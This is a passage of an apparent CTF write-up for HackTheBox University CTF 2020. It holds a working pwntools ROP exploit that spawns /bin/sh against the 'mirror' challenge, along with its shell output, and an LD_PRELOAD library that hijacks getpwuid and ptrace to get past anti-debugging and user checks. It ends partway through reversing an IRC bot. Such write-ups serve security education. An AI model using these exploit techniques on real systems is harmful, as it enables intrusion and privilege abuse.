</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">():
    libc, r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">()

    libc_rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span style="color:#ccc9c2;">(libc)
    POP_RDI </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(libc_rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_gadget</span><span style="color:#ccc9c2;">([</span><span style="color:#bae67e;">&#39;pop rdi&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;ret&#39;</span><span style="color:#ccc9c2;">]))[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">]

    </span><span style="color:#ffd580;">send_padded</span><span style="color:#ccc9c2;">(r</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;y&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x1f</span><span style="color:#ccc9c2;">)

    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;This is a gift from the craftsman..&quot;</span><span style="color:#ccc9c2;">)
    addresses </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span style="color:#ccc9c2;">()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span style="color:#ccc9c2;">()

    capture </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;</span><span style="background-color:#ffa759;color:#ffffff;">\[</span><span style="color:#bae67e;">(.*)</span><span style="background-color:#ffa759;color:#ffffff;">\]</span><span style="color:#bae67e;"> </span><span style="background-color:#ffa759;color:#ffffff;">\[</span><span style="color:#bae67e;">(.*)</span><span style="background-color:#ffa759;color:#ffffff;">\]</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">addresses)
    stack_addr </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#ccc9c2;">(capture</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2;">)
    printf_addr </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#ccc9c2;">(capture</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2;">)
    stack_exec_addr </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">stack_addr </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">8 </span><span style="font-style:italic;color:#5c6773;"># gotta move this back 8 bytes so that the stored return pointer is at the front of our buffer
    </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">printf_addr </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">libc</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&quot;printf&quot;</span><span style="color:#ccc9c2;">]

    libc</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">address </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base
    buf </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ccc9c2;">POP_RDI) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">next</span><span style="color:#ccc9c2;">(libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span style="color:#ccc9c2;">))) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(libc</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;system&#39;</span><span style="color:#ccc9c2;">]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;B&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">bytes</span><span style="color:#ccc9c2;">([(stack_exec_addr) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span style="color:#ccc9c2;">])
    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span style="color:#ccc9c2;">(buf)
    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)

    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span style="color:#ccc9c2;">()


</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span style="color:#ccc9c2;">:
    </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">()
</span></code></pre><pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python mirror.py
[*] &#39;/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] &#39;/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to docker.hackthebox.eu on port 30272: Done
[*] Loading gadgets for &#39;/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so&#39;
[*] Switching to interactive mode
Now you can talk to the mirror.
&gt; $ cat flag.txt
HTB{0n3_byt3_cl0s3r_2_v1ct0ry}
$  
</span></code></pre><h1 id="hi-my-name-is-what">Hi! My name is (what?)</h1>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">I&#39;ve been once told that my name is difficult to pronounce and since then I&#39;m using it as a password for everything.
</span></code></pre><h2 id="initial-review-3">initial review</h2>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  EVP_PKEY_CTX </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">ctx</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  __uid_t __uid</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  passwd </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">ppVar1</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">long</span><span style="color:#ccc9c2;"> lVar2</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> iVar3</span><span style="color:#ccc9c2cc;">;
  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span style="color:#ccc9c2;">sVar4</span><span style="color:#ccc9c2cc;">;
  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">outlen</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  uchar </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">in</span><span style="color:#ccc9c2cc;">;
  </span><span style="font-style:italic;color:#5ccfe6;">size_t</span><span style="color:#ccc9c2;"> in_stack_ffffffd0</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> local_28</span><span style="color:#ccc9c2cc;">;
  
  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Who are you?&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  __uid </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">geteuid</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  ppVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">getpwuid</span><span style="color:#ccc9c2;">(__uid)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  in </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(uchar </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  lVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ptrace</span><span style="color:#ccc9c2;">(PTRACE_TRACEME</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(lVar2 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
    </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;This doesn</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">t seem right&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
    </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(ppVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#ccc9c2;">(passwd </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2;">) {
    ctx </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(EVP_PKEY_CTX </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)ppVar1</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">pw_name</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">    iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span style="color:#ccc9c2;">((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)ctx</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">username)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(iVar3 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
      local_28 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffa759;">while </span><span style="color:#ccc9c2;">(local_28 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x198</span><span style="color:#ccc9c2;">) {
        </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">((</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">(</span><span style="font-style:italic;color:#5ccfe6;">uint </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)(main </span><span style="color:#f29e74;">+</span><span style="color:#ccc9c2;"> local_28) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">==</span><span style="color:#ccc9c2;"> breakpointvalue) {
          </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;What</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">s this now?&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
          </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
        </span><span style="color:#ccc9c2;">}
        local_28 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> local_28 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ccc9c2;">}
      sVar4 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span style="color:#ccc9c2;">(encrypted_flag)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">      outlen </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(</span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)</span><span style="color:#f28779;">malloc</span><span style="color:#ccc9c2;">((sVar4 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffd580;">decrypt</span><span style="color:#ccc9c2;">(ctx</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">encrypted_flag</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">outlen</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">in</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">in_stack_ffffffd0)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">(undefined </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)((</span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;">)outlen </span><span style="color:#f29e74;">+ </span><span style="color:#ccc9c2;">sVar4) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">)outlen)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
    </span><span style="color:#ffa759;">else </span><span style="color:#ccc9c2;">{
      </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;No you are not the right person&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">}
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
    </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;?&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
  </span><span style="color:#f28779;">exit</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>So, we see a couple anti-debugging features (ptrace, etc) but those aren't super relevant.  If the current executing username matches <code>~#L-:4;f</code> then it will decrypt a stored flag and print it.  The decryption involves the username so we can't just binary patch the username check away.  This is problematic because this is not a valid linux username.  So, what can we do?</p>
<h2 id="i-can-so-ptrace-alternative-title-how-you-can-just-overwrite-any-dynamic-library-function">i can so ptrace (alternative title: how you can just overwrite any dynamic library function)</h2>
<p>Fun fact: on a Linux system the dynamic linker will check the environmental variable LD_PRELOAD for libraries and then bind those symbols before any other libraries.  What happens if two libraries provide the same symbol?  Well, the one which loads first!  LD_PRELOAD goes before any linked libraries which means that if you preload a shared library which exports a symbol it will override the symbol from the later loading library.  What this means is that we can just overwrite getpwuid so that it returns a struct with an arbitrary username!</p>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/types.h&gt;
</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;pwd.h&gt;


</span><span style="color:#ffa759;">long </span><span style="color:#ffd580;">ptrace</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">request</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">pid_t </span><span style="color:#ffcc66;">pid</span><span style="color:#ccc9c2cc;">,
                   </span><span style="color:#ffa759;">void </span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">addr</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">void </span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">data</span><span style="color:#ccc9c2;">) {
	</span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}

</span><span style="color:#ffa759;">struct</span><span style="color:#ccc9c2;"> passwd </span><span style="color:#f29e74;">*</span><span style="color:#ffd580;">getpwuid</span><span style="color:#ccc9c2;">(</span><span style="font-style:italic;color:#5ccfe6;">uid_t </span><span style="color:#ffcc66;">uid</span><span style="color:#ccc9c2;">) {
	</span><span style="color:#ffa759;">struct</span><span style="color:#ccc9c2;"> passwd</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;"> ret </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">sizeof</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">struct</span><span style="color:#ccc9c2;"> passwd))</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">	ret</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">pw_name </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;~#L-:4;f&quot;</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">	ret</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">pw_passwd </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;a&quot;</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">	ret</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">pw_uid </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">	ret</span><span style="color:#f29e74;">-&gt;</span><span style="color:#ccc9c2;">pw_gid </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
	</span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2;"> ret</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre><pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ gcc -m32 preload.c -shared -o preload.so
❯ LD_PRELOAD=$(pwd)/preload.so ./my_name_is
Who are you?
HTB{L00k1ng_f0r_4_w31rd_n4m3}
</span></code></pre><h1 id="ircware">ircware</h1>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">During a routine check on our servers we found this suspicious binary, but when analyzing it we couldn&#39;t get it to do anything. We assume it&#39;s dead malware but maybe something interesting can still be extracted from it?
</span></code></pre><h2 id="initial-review-4">initial review</h2>
<h3 id="entry">entry</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ccc9c2;">undefined  [</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2;">] </span><span style="color:#ffd580;">entry</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> iVar1</span><span style="color:#ccc9c2cc;">;
  
                    </span><span style="font-style:italic;color:#5c6773;">/* rax = 0x13e, getrandom */
  </span><span style="color:#ffd580;">syscall</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">_13_4_ </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">_13_4_ </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0x7070707</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">_13_4_ </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> s_NICK_ircware_0000_00601018</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">_13_4_ </span><span style="color:#f29e74;">| </span><span style="color:#ffcc66;">0x30303030</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">connect_localhost_8000</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x601025</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#f29e74;">&lt;</span><span style="color:#ccc9c2;"> iVar1) {
    write_empty_line</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">    write_empty_line</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">    write_empty_line</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ffa759;">do </span><span style="color:#ccc9c2;">{
      read</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffd580;">command_handler</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
    </span><span style="color:#ccc9c2;">} </span><span style="color:#ffa759;">while</span><span style="color:#ccc9c2;">( </span><span style="color:#ffcc66;">true </span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ccc9c2;">}
  </span><span style="color:#ffd580;">syscall</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffd580;">syscall</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
  </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">CONCAT88</span><span style="color:#ccc9c2;">(DAT_00601068</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x3c</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>Not a lot in the entry function.  It connects to a local server on port 8000 and then does some read/write on that socket but doesn't seem to actually write much.</p>
<h3 id="command-handler">command_handler</h3>
<pre style="background-color:#212733;">
<code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">command_handler</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)

{
	  </span><span style="color:#f29e74;">...
</span><span style="color:#ccc9c2;">      lVar5 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> DAT_00601179</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">      pcVar9 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> pcVar13</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">      pcVar11 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> s_PRIVMSG_#secret_</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">@pass_00601161</span><span style="color:#ccc9c2cc;">;
	  </span><span style="color:#f29e74;">...
</span><span style="color:#ccc9c2;">      pcVar9 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> pcVar13</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">      pcVar11 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> s_PRIVMSG_#secret_</span><span style="color:#f29e74;">:</span><span style="color:#ccc9c2;">@flag_00601128</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffa759;">do </span><span style="color:#ccc9c2;">{
        pcVar12 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> pcVar11</span><span style="color:#ccc9c2cc;">;
        </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(lVar5 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">        lVar5 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> lVar5 </span><span style="color:#f29e74;">+ -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">        pcVar12 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> pcVar11 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">        cVar1 </span><span style="color:#f29e74;">= *</span><span style="color:#ccc9c2;">pcVar9</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">        cVar2 </span><span style="color:#f29e74;">= *</span><span style="color:#ccc9c2;">pcVar11</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">        pcVar9 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> pcVar9 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
</span><span style="color:#ccc9c2;">        pcVar11 </span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;"> pcVar12</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ccc9c2;">} </span><span style="color:#ffa759;">while </span><span style="color:#ccc9c2;">(cVar1 </span><span style="color:#f29e74;">==</span><span style="color:#ccc9c2;"> cVar2)</span><span style="color:#ccc9c2cc;">;
      </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(lVar5 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
        </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(_DAT_00601008 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">) {
          </span><span style="color:#ffd580;">FUN_00400485</span><span style="color:#ccc9c2;">(pcVar12</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">s_Requires_password_006010c2</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span style="color:#ccc9c2;">DAT_006021a9</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">DAT_006010d4)</span><span style="color:#ccc9c2cc;">;
          </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;

</span><span style="color:#ccc9c2;">}
</span></code></pre>
<p>I've stripped large parts of this function out because they weren't super useful decompilation and this contains the relevant bits.  The important things to notice here are that:</p>
<ol>
<li>This is IRC -- the PRIMSG #secret is a dead giveaway.  I just guessed at this point that it wanted an IRC server so I ran one and joined the #secret channel.</li>
<li>the is a @flag command but it requires a password</li>
<li>there is a @pass function</li>
</ol>
<p>The implication here is that this is an IRC bot and we need to give it the correct password before it will give us the flag.</p>
<h2 id="so-what-s-the-password">so what's the password?</h2>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">                             LAB_00400401                                    XREF[1]:     0040043c(j)  
        00400401 8a 06           MOV        AL,byte ptr [RSI]=&gt;DAT_006021c0                  = ??
        00400403 88 03           MOV        byte ptr [RBX]=&gt;DAT_00601147,AL                  = &quot;JJ3DSCP&quot;
                                                                                             = 52h
        00400405 3c 00           CMP        AL,0x0
        00400407 74 35           JZ         LAB_0040043e
        00400409 3c 0a           CMP        AL,0xa
